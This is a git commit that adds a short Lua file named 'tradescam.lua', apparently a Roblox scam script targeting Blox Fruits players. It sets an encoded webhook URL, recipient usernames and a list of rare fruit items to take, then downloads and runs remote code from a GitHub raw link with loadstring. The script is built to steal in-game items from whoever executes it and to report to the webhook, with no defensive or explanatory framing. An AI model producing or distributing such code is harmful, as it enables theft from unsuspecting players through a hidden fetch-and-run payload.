f43ca0ed47776765202e55d5009d00f33937ea37
minktu <minktu2011@gmail.com>
2025-03-30 21:13:37 +0700

    Create tradescam.lua

---
+++ tradescam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=WU9WT0ZrclN3eFROdTFlVkR4VVIyQTpuSnQ4Q2JaekRNRF9qT0QyZXYzVXVBaVJXU2JkRkxqWEVqMHhGSG1Jd01NcTg2ZDJyTmtuMTJwbW1IZF9BdEhWbjc4MzBQMlViOFBiUXRnYVFoZnF3bVozUDBtV3g5aUxDaElXNXR6NW1IZDNYV1lxQlpHb3hvTGE2YW9idnRrbFBFaElyeDZrRGxSLVVBbktrMC1vWFI2ZTVXX0ZpWjdTeHZGQzBhNVkwbXc"
+Usernames = {"khongtieude35", "khongtieude35"}
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "DragonWest-DragonWest"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
